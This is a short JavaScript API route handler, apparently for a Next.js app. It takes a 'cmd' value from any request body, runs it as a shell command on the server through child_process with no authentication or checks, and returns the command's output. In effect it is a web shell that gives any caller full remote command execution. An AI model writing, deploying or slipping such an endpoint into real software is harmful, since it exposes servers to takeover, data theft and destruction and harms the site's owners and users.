const exec = require('child_process').spawnSync;

export default function handler(req, res) {
    console.log(req.body)
    let cmd = req.body.cmd
    console.log(cmd); 
    let p = exec(cmd, { shell: true, encoding:'utf8' });
    console.log(p);
    res.status(200).json({ 
        cmd: cmd,
        stdout: p.stdout.toString().trim(),
        stderr: p.stderr.toString().trim(),
    })
}